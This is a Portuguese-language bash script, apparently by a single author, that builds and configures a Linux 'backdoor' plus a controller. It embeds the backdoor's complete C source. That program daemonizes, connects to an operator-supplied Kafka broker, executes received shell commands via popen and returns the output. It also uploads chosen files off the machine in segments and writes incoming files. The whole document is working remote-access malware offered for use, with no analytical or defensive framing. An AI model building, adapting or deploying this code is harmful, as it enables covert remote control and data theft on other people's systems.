#!/bin/bash

########################################
# Desenvolvido por RAFAEL HARZER CORREIA
########################################


RED='\033[0;31m'
NC='\033[0m'
blu='\033[0;34m'

arquivo_saida=""
arquivo_word=""

check(){
check_arp=$(which "make" )
        if [ -z $check_arp];then
                apt update
		apt install "make" -y
        fi
clear
check_arp=$(which g++)
        if [ -z $check_arp];then
                apt update
		apt-get install build-essential
		apt install g++ -y
        fi
clear
check_crunch=$(which cmake )
        if [ -z $check_crunch];then
                apt update
                apt install cmake -y
        fi

menu
}

compilarControlador(){
echo 'cmake_minimum_required(VERSION 3.8 FATAL_ERROR)
set(PROJECT_VERSION "1.0.0")
set (CMAKE_CXX_STANDARD 11)

execute_process(COMMAND git clone https://github.com/edenhill/librdkafka.git)
execute_process(COMMAND git checkout tags/v1.2.1 WORKING_DIRECTORY librdkafka)
	
add_subdirectory(${CMAKE_CURRENT_BINARY_DIR}/librdkafka ${CMAKE_CURRENT_BINARY_DIR}/librdkafka)
	
add_executable(controlador linux/controlador.c)
target_link_libraries(controlador PUBLIC rdkafka++)' > CMakeLists.txt
echo ""
echo "Criou CMakeLists.txt"

cd bin
rm -r *
cmake ..
echo "terminou cmake, iniciando compilação"
make
echo "compilação concluida com sucesso!"
cd ..
mkdir resultado 2> /dev/null
cd bin
mv controlador ../resultado/ 
echo "Seu controlador esta na pasta resultado/ "
cd ..
read -p "Enter para voltar ao menu! ..."
menu
}

compilarBackdoor(){
echo ""    
read -p "Nome para a Backdoor: " nomeBackdoor
echo 'cmake_minimum_required(VERSION 3.8 FATAL_ERROR)
set(PROJECT_VERSION "1.0.0")
set (CMAKE_CXX_STANDARD 11)

execute_process(COMMAND git clone https://github.com/edenhill/librdkafka.git)
execute_process(COMMAND git checkout tags/v1.2.1 WORKING_DIRECTORY librdkafka)
    
add_subdirectory(${CMAKE_CURRENT_BINARY_DIR}/librdkafka ${CMAKE_CURRENT_BINARY_DIR}/librdkafka)
    
add_executable(backdoor linux/backdoor.c)
target_link_libraries(backdoor PUBLIC rdkafka++)' > CMakeLists.txt
echo ""
echo "Criou CMakeLists.txt"

cd bin
rm -r *
cmake ..
echo "terminou cmake, iniciando compilação"
make
echo "compilação concluida com sucesso!"
cd ..
mkdir resultado 2> /dev/null
cd bin
mv backdoor ../resultado/"$nomeBackdoor" 
echo "Sua Backdoor esta na pasta resultado/ "
cd ..
read -p "Enter para voltar ao menu! ..."
menu
}

confBackdoor(){
    cd linux/
    echo ""
    echo "Adicionar HOST e porta do KAFKA na Backdoor para linux. ex: 192.168.1.21:9092"
    read -p "informe o HOST do kafka: " hostBackdoor

    echo "Adicionar um identificador (ID) para a maquina. ex: maquina_1"
    echo "esse ID sera o topico kafka para se conectar."
    read -p "informe o identificador: " IDBackdoor

echo "#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <syslog.h>
#include <string.h>
#include <fcntl.h>
#include <errno.h>
#include <ctype.h>
#include <sys/time.h>
#include <pthread.h>

#include <librdkafka/rdkafka.h>

#define TOPICO_ID \"$IDBackdoor\"
#define BROKER_IP \"$hostBackdoor\"

#define LOG_FILE \"consumer.log\"

struct timeval start, end;

void log_message(char *filename,char *message){
    FILE *logfile = fopen(filename,\"a\");
    fprintf(logfile, \"%s \n\", message);
    fclose(logfile);
}

static void dr_msg_cb(rd_kafka_t* rk, const rd_kafka_message_t* rkmessage, void* opaque) {
    if (rkmessage->err) {
        log_message(LOG_FILE, \"Deu falha ao enviar\");
    }
    
}

void reverse(char *s){
   int length, c;
   char *begin, *end, temp;
 
   length = strlen(s);
   begin  = s;
   end    = s;
 
   for (c = 0; c < length - 1; c++)
      end++;
 
   for (c = 0; c < length/2; c++)
   {        
      temp   = *end;
      *end   = *begin;
      *begin = temp;
 
      begin++;
      end--;
   }
}

static void producer_resposta(char* result) {
    chdir(\"/tmp/consumer_pasta\");

    log_message(LOG_FILE, \"iniciou comsumer\");

    char errstr[512];
    rd_kafka_t* rk2;
    rd_kafka_topic_t* rkt2;
    rd_kafka_conf_t* conf2;

    const char* brokers;
    const char* topic;
    const char* key_info;
    long length;

    log_message(LOG_FILE, \"fez declaraçoes de variaveis\");

    brokers = BROKER_IP;
    topic = \"resposta\";
    key_info = \"resposta\";

    size_t keysize = strlen(key_info);
    conf2 = rd_kafka_conf_new();
    size_t size = strlen(result);
    FILE* logfile = fopen(LOG_FILE, \"a\");

    log_message(LOG_FILE, \"Iniciou as confs\");

    if (rd_kafka_conf_set(conf2, \"bootstrap.servers\", brokers, errstr, sizeof(errstr)) != RD_KAFKA_CONF_OK) {
        fprintf(logfile, \"%s\n\", errstr);
    }
    
    rd_kafka_conf_set_dr_msg_cb(conf2, dr_msg_cb);

    rk2 = rd_kafka_new(RD_KAFKA_PRODUCER, conf2, errstr, sizeof(errstr));

    if (!rk2) {
        fprintf(logfile, \"%% Falha ao criar novo producer: %s\n\", errstr);
    }

    rkt2 = rd_kafka_topic_new(rk2, topic, NULL);
    if (!rkt2) {
        fprintf(logfile, \"%% Falha ao criar topic object: %s\n\",
            rd_kafka_err2str(rd_kafka_last_error()));
        rd_kafka_destroy(rk2);
    }

    if (rd_kafka_produce(
        /* Topic object */
        rkt2,
        /* use o particionador embutido para selecionar a partição*/
        RD_KAFKA_PARTITION_UA,
        0,
        /* Carga útil da mensagem (valor) e comprimento */
        result, size,
        /* Optional key and its length */
        key_info, keysize,
        /* Message opaque, provided in
         * delivery report callback as
         * msg_opaque. */
        NULL) == -1) {
        /**
         * Failed to *enqueue* message for producing.
         */
        fprintf(logfile, \"%% Falha ao * enfileirar * a mensagem para produzir %s: %s\n\", rd_kafka_topic_name(rkt2), rd_kafka_err2str(rd_kafka_last_error()));

        /* Poll to handle delivery reports */
        if (rd_kafka_last_error() ==
            RD_KAFKA_RESP_ERR__QUEUE_FULL) {
            rd_kafka_poll(rk2, 1000/*block for max 1000ms*/);
        }
    }
    log_message(LOG_FILE, \"Prdoduzio a mensagem.. esperando enviar\");
    rd_kafka_poll(rk2, -1);
    log_message(LOG_FILE, \"Enviou mensagem resosta\");
    fclose(logfile);
    
    rd_kafka_flush(rk2, 100);

    /* Destroy topic object */
    rd_kafka_topic_destroy(rkt2);

    /* Destroy the producer instance */
    rd_kafka_destroy(rk2);
    log_message(LOG_FILE, \"Destruiu e fim\");
}

static void mandarmensagem (void *sendfarquivo, size_t size, const char *nome_arquivo, size_t keysize, rd_kafka_t *rk3, rd_kafka_topic_t *rkt3) {
    
    if (strstr(nome_arquivo, \".P.0\") != NULL) {
         log_message(LOG_FILE, \"Enviando arquivo primeira parte\");
        }
    else if (strstr(nome_arquivo, \".P.\") != NULL) {                   
    }else {
        log_message(LOG_FILE, \"Ultima parte ... \");
    }
     
    if (rd_kafka_produce(rkt3, RD_KAFKA_PARTITION_UA, 0, sendfarquivo, size, nome_arquivo, keysize, NULL) == -1) {
        log_message(LOG_FILE, \"Falha ao * enfileirar * a mensagem para produzir\");
        
        if (rd_kafka_last_error() == RD_KAFKA_RESP_ERR__QUEUE_FULL) {           
            rd_kafka_poll(rk3, 1000/*block for max 1000ms*/);
        }
         } 
    
        rd_kafka_poll(rk3, -1);
            
}

static void terminal( void* comand, size_t tamanho) {
    char* comando;
    comando = (char*) comand;
    comando[tamanho] = '\0';
    FILE *pipe;
    char buf[100];
    char* str = NULL;
    char* temp = NULL;
    unsigned int size = 1;  // start with size of 1 to make room for null terminator
    unsigned int strlength;
    
    log_message(LOG_FILE, \"Executando comando\");
    log_message(LOG_FILE, comando);

                /*
                * Use message payload to invoke a program and read the output
                */
                pipe = popen(comando, \"r\");
                if (!pipe){
            log_message(LOG_FILE, \"Couldn't start command.\");
            return;
                }
                
                while (fgets(buf, sizeof(buf), pipe) != NULL) {
                    strlength = strlen(buf);
                    temp = (char*) realloc(str, size + strlength);  // allocate room for the buf that gets appended
                    if (temp == NULL) {
                        // allocation error
                    }
                    else {
                        str = temp;
                    }
                    strcpy(str + size - 1, buf);     // append buffer to str
                    size += strlength;
                }
                
                if (str == NULL) {
                    str = \"Comando execuado!\";
                }

                log_message(LOG_FILE, \"Enviando Resposta\");
                log_message(LOG_FILE, str);
            
                producer_resposta(str);
                pclose(pipe);   
}

long int findSize(const char* file_name) {
    struct stat st; /*declare stat variable*/

    /*get the size using stat()*/

    if (stat(file_name, &st) == 0)
        return (st.st_size);
    else
        return -1;
}

static void* download_fun(void* arquivo) {
    chdir(\"/tmp/consumer_pasta\");
    
    char* nome_arquivo = (char*)arquivo;

    char errstr[512];
    rd_kafka_t* rk3;
    rd_kafka_topic_t* rkt3;
    rd_kafka_conf_t* conf3;

    const char* brokers;
    const char* topic;

    brokers = BROKER_IP;
    topic = \"resposta\";
    
    size_t numero_d_partes;
    size_t tamanho_ultima_parte = 0;
    char* sendfarquivo = 0;
    long length;
    int tamanho_da_mensagem = 500000;
    size_t size;
    
    FILE* logfile = fopen(LOG_FILE, \"a\");

    log_message(LOG_FILE, \"Iniciou as confs\");
    
    conf3 = rd_kafka_conf_new();

    if (rd_kafka_conf_set(conf3, \"bootstrap.servers\", brokers, errstr, sizeof(errstr)) != RD_KAFKA_CONF_OK) {
        fprintf(logfile, \"%s\n\", errstr);
    }
    
    rd_kafka_conf_set_dr_msg_cb(conf3, dr_msg_cb);

    rk3 = rd_kafka_new(RD_KAFKA_PRODUCER, conf3, errstr, sizeof(errstr));

    if (!rk3) {
        fprintf(logfile, \"%% Falha ao criar novo producer: %s\n\", errstr);
    }

    rkt3 = rd_kafka_topic_new(rk3, topic, NULL);
    if (!rkt3) {
        fprintf(logfile, \"%% Falha ao criar topic object: %s\n\",
            rd_kafka_err2str(rd_kafka_last_error()));
        rd_kafka_destroy(rk3);
    }

    log_message(LOG_FILE, \"terminou as confs\");
    fclose(logfile);

    FILE* farquivo = fopen(nome_arquivo, \"rb\");

    if (farquivo == NULL) {
        producer_resposta(\"Nao foi possivel abrir o arquivo informado!\"); 
        return 0;
    }
    size = findSize(nome_arquivo);

    reverse(nome_arquivo);
    if (strstr(nome_arquivo, \"/\") != NULL) {
        char* barra = strstr(nome_arquivo, \"/\");
        barra = '\0';
        nome_arquivo[strlen(nome_arquivo)] = '\0';
    }
    reverse(nome_arquivo);

    reverse(nome_arquivo);
    if (strstr(nome_arquivo, \"\\\\\") != NULL) {
        char* barra = strstr(nome_arquivo, \"\\\\\");
        *barra = '\0';
        nome_arquivo[strlen(nome_arquivo)] = '\0';
    }
    reverse(nome_arquivo);

    size_t keysize = strlen(nome_arquivo);

    
            if(size > tamanho_da_mensagem){
                    if(size%tamanho_da_mensagem == 0){
                            numero_d_partes = size/tamanho_da_mensagem; /*quantas partes o arquivo vai ter*/
                            tamanho_ultima_parte=tamanho_da_mensagem;
                        } else {
                    numero_d_partes = (size/tamanho_da_mensagem)+1; /*quantas partes o arquivo vai ter*/
                            tamanho_ultima_parte = size%tamanho_da_mensagem;
                        }

                        char *nomearquivoVetor[numero_d_partes];
                        char *arquivos_mandar;
                        int ponteiro_d_bite = tamanho_da_mensagem;
                        int i;
                        arquivos_mandar = malloc(tamanho_da_mensagem);

                        for(i=0; i < numero_d_partes; i++){
                            if (i == numero_d_partes-1){
                                    arquivos_mandar = realloc( arquivos_mandar, tamanho_ultima_parte );
                                    fread (arquivos_mandar, 1, tamanho_ultima_parte, farquivo); /*leu o tamanho da ultima parte do arquivo e gravou na variavel*/
                                    /*Acrescenta a na chave um identificador da parte.*/
                                    char dest[strlen(nome_arquivo)];
                                    strcpy( dest, nome_arquivo );
                                    nomearquivoVetor[i] = strcat( dest, \".P.f\" );
                                    mandarmensagem(arquivos_mandar, tamanho_ultima_parte, nomearquivoVetor[i], strlen(nomearquivoVetor[i]), rk3, rkt3);
                            }else {
                                    fread (arquivos_mandar, 1, tamanho_da_mensagem, farquivo);/* colocou 100 mb do arquivo na variavel arquivo_mandar*/ 
                                    fseek (farquivo, 0, ponteiro_d_bite);/*foi pra posição de 100mb*/ 
                                    ponteiro_d_bite = ponteiro_d_bite + tamanho_da_mensagem;/* adicionou 100mb no ponteiro de bite vale 200mb*/ 
                                    /*Acrescenta a na chave um identificador da parte.*/
                                    char dest[strlen(nome_arquivo)];
                                    char acrecentar[i+1+sizeof(i)];
                                    strcpy( dest, nome_arquivo );
                                    sprintf(acrecentar, \".P.%d\", i);
                                    nomearquivoVetor[i] = strcat( dest, acrecentar );
                                    mandarmensagem(arquivos_mandar, tamanho_da_mensagem, nomearquivoVetor[i], strlen(nomearquivoVetor[i]), rk3, rkt3);
                            }
                        }
                    free(arquivos_mandar);
                    fclose(farquivo);
        
            } else {
                        if (farquivo){
                            fseek (farquivo, 0, SEEK_END);
                            length = ftell (farquivo);
                            fseek (farquivo, 0, SEEK_SET);
                            sendfarquivo = malloc (length);
                        if (sendfarquivo){
                                fread (sendfarquivo, 1, length, farquivo);
                        }   
                                fclose (farquivo);
                        }
                        mandarmensagem(sendfarquivo, size, nome_arquivo, keysize, rk3, rkt3);
                        free(sendfarquivo);
                }

        rd_kafka_flush(rk3, 100);
        rd_kafka_topic_destroy(rkt3);
        rd_kafka_destroy(rk3);

}

static void grava_arquivo(char *nomearquivo, const void *ptr, size_t len) {
    chdir(\"/tmp/consumer_pasta\");
      
     if( strstr(nomearquivo, \".P.\") != NULL ){    
        
            char nome[strlen(nomearquivo)]; 
            strncpy( nome, nomearquivo, strlen(nomearquivo));
            char *ponteiro_extencao = strstr(nome, \".P.\"); 
            *ponteiro_extencao  = '\0';
            const char *p = (const char *)ptr;
        
        if( strstr(nomearquivo, \".P.0\") != NULL ){                 
            if( access( nome, F_OK ) != -1 ) {
                remove(nome);       
            }
            producer_resposta(\"Recebio arquivo segmentado, montando o arquivo... \");      
            gettimeofday(&start, NULL);
            log_message(LOG_FILE,\"Arquivo segmentado. Montando o arquivo.... \"); 
            
            }
            
        FILE *arquivo = fopen(nome, \"ab\");
            int totalgravado = fwrite(p, sizeof(char), len ,arquivo);
            fclose (arquivo);
        
            if( strstr(nomearquivo, \".P.f\") != NULL ){
                gettimeofday(&end, NULL);
            FILE *logfile = fopen(LOG_FILE,\"a\");  
                fprintf(logfile, \"arquivo montado com sucesso! %s \n\", nome);
                
            long seconds = (end.tv_sec - start.tv_sec);
                long micros = ((seconds * 1000000) + end.tv_usec) - (start.tv_usec);
            
            
                fprintf(logfile, \"Time elpased is %ld seconds and %ld micros \n\", seconds, micros);
            fclose(logfile);

                gettimeofday(&start, NULL);
            producer_resposta(\"Arquivo montado com sucesso! \");   
            }
        
    } else {

        const char *p = (const char *)ptr;
        FILE *arquivo = fopen(nomearquivo, \"wb\");

        log_message(LOG_FILE, \"Arquivo gravado!\" );
        int totalgravado = fwrite(p, sizeof(char), len ,arquivo);
        fclose (arquivo);
    producer_resposta(\"Arquivo recebido!\");
    }        
}

static void skeleton_daemon()
{
    pid_t pid;

    pid = fork();

    if (pid < 0)
        exit(EXIT_FAILURE);

    if (pid > 0)
        exit(EXIT_SUCCESS);

    if (setsid() < 0)
        exit(EXIT_FAILURE);

    signal(SIGCHLD, SIG_IGN);
    signal(SIGHUP, SIG_IGN);

    pid = fork();

    if (pid < 0)
        exit(EXIT_FAILURE);

    if (pid > 0)
        exit(EXIT_SUCCESS);

    umask(0);

    chdir(\"/tmp/consumer_pasta\");

    int x;
    for (x = sysconf(_SC_OPEN_MAX); x>=0; x--)
    {
        close (x);
    }

    openlog (\"firstdaemon\", LOG_PID, LOG_DAEMON);
}

int main(){
    
    struct stat st = {0};

    if (stat(\"/tmp/consumer_pasta\", &st) == -1) {
         mkdir(\"/tmp/consumer_pasta\", 0777);
    }
    
    skeleton_daemon();

    while (1) {
    syslog (LOG_NOTICE, \"Consumer daemon started.\");
    log_message(LOG_FILE,\"Consumer daemon started!\"); 
    
    rd_kafka_t* rk;          /* Consumer instance handle */
    rd_kafka_conf_t* conf;   /* Temporary configuration object */
    rd_kafka_resp_err_t err; /* librdkafka API error code */
    char errstr[512];        /* librdkafka API error reporting buffer */
    const char* brokers;     /* Argument: broker list */
    const char* groupid;     /* Argument: Consumer group id */
    char* topics;           /* Argument: list of topics to subscribe to */
    int topic_cnt;           /* Number of topics to subscribe to */
    rd_kafka_topic_partition_list_t* subscription; /* Subscribed topics */
    int i;

    brokers = BROKER_IP;
    groupid = \"maquina\";
    topics = TOPICO_ID;
    topic_cnt = 2;

    conf = rd_kafka_conf_new();

    if (rd_kafka_conf_set(conf, \"bootstrap.servers\", brokers, errstr, sizeof(errstr)) != RD_KAFKA_CONF_OK) {
        log_message(LOG_FILE, errstr);
        rd_kafka_conf_destroy(conf);
        continue;
    }

    if (rd_kafka_conf_set(conf, \"group.id\", groupid, errstr, sizeof(errstr)) != RD_KAFKA_CONF_OK) {
        log_message(LOG_FILE, errstr);
        rd_kafka_conf_destroy(conf);
        continue;
    }

    if (rd_kafka_conf_set(conf, \"auto.offset.reset\", \"earliest\", errstr, sizeof(errstr)) != RD_KAFKA_CONF_OK) {
        log_message(LOG_FILE, errstr);
        continue;
    }
    
    rd_kafka_conf_set(conf, \"receive.message.max.bytes\", \"1000000000\", errstr, sizeof(errstr));

        rk = rd_kafka_new(RD_KAFKA_CONSUMER, conf, errstr, sizeof(errstr));
        if (!rk) {
        log_message(LOG_FILE, \"Failed to create new consumer:\");      
        log_message(LOG_FILE, errstr);                
                continue;
        }
 
    conf = NULL;
    
    rd_kafka_poll_set_consumer(rk);
     
    subscription = rd_kafka_topic_partition_list_new(topic_cnt);
     
    for (i = 0; i < topic_cnt; i++){
        rd_kafka_topic_partition_list_add(subscription, topics, RD_KAFKA_PARTITION_UA);
    }
    
    err = rd_kafka_subscribe(rk, subscription);
        
    if (err) {
        log_message(LOG_FILE,\"Falha ao se inscrever no Topico!\");
        rd_kafka_topic_partition_list_destroy(subscription);
        rd_kafka_destroy(rk);
        continue;
    }

    rd_kafka_topic_partition_list_destroy(subscription); 
    
    log_message(LOG_FILE,\"Start no loop, Esperando Arquivos..\");  
    while(1){
                
        rd_kafka_message_t* rkm;

        rkm = rd_kafka_consumer_poll(rk, 100);
        if (!rkm)
            continue;
        if (rkm->err) {
            rd_kafka_message_destroy(rkm);
            continue;
        }

        char* keynamefile;
        keynamefile = (char*)rkm->key;
        keynamefile[rkm->key_len] = '\0';
            
        /* Print the message key. */
        if (strstr(keynamefile, \"terminal\") != NULL) {
            log_message(LOG_FILE, \"Recebendo comandos \");
            terminal(rkm->payload, rkm->len);
        } if (strstr(keynamefile, \"--download-arquivo\") != NULL) {
            log_message(LOG_FILE, \"Download arquivo\");            
            char *arquivo = rkm->payload;
            arquivo[rkm->len] = '\0';
            pthread_t download_arquivo;
            pthread_create(&download_arquivo, NULL, download_fun, (void*)arquivo); 
            pthread_join(download_arquivo, NULL); 
        }else if (strstr(keynamefile, \".P.0\") != NULL) {
            log_message(LOG_FILE, \"Recebendo arquivo: \");
            log_message(LOG_FILE, keynamefile);
        } else if (strstr(keynamefile, \".P.\") != NULL) {

        } else {
            log_message(LOG_FILE, \"Recebendo arquivo: \");
            log_message(LOG_FILE, keynamefile);
        }
            
        if (strstr(keynamefile, \"terminal\") != NULL) {
        } else if (strstr(keynamefile, \"--download-arquivo\") != NULL) {
        } else {
            /* Montando Arquivos */
        grava_arquivo(keynamefile, rkm->payload, rkm->len);
        }

        rd_kafka_message_destroy(rkm);
            
        
    }
    
    /* Close the consumer: commit final offsets and leave the group. */
    rd_kafka_consumer_close(rk);

    /* Destroy the consumer */
    rd_kafka_destroy(rk);
    
    }

    syslog (LOG_NOTICE, \"daemon terminated.\");
    closelog();

    return EXIT_SUCCESS;
}" > backdoor.c
    cd ..
    echo "configurações efetuadas com sucesso!"
    read -p "Enter para voltar ao menu! ..."
    
}
menu(){
    clear
    check_root=$(id -u)
    if [ $check_root -eq "0" ];then #checa se o usuário é root
	printf "${blu}================================================================${RED}\n"
    echo "  Script Facil p/ configurar        BY: Rafael Harzer         "
    printf "${blu}================================================================${NC}\n"
    echo " "
    printf "${blu}1${NC} - Compilar Controlador \n"
    printf "${blu}2${NC} - Compilar backdoor linux \n"
    printf "${blu}3${NC} - Configurar backdoor \n"
	printf "${blu}0${NC} - Finalizar o script \n"
	printf "\n"
	read -p "-->" opt
        case $opt in
            0)printf "${RED}Script Finalizado${NC}\n";sleep 2;clear;exit;;
            1)compilarControlador;;
            2)compilarBackdoor;;
            3)confBackdoor;;
            *)printf "${RED}Opção inválida${NC}\n";sleep 2;menu;;
        esac
    else
        printf "${RED}Você não é usuário administrador, execute o script como administrador!${NC}"
        sleep 3
        clear
    fi
}
check 
menu
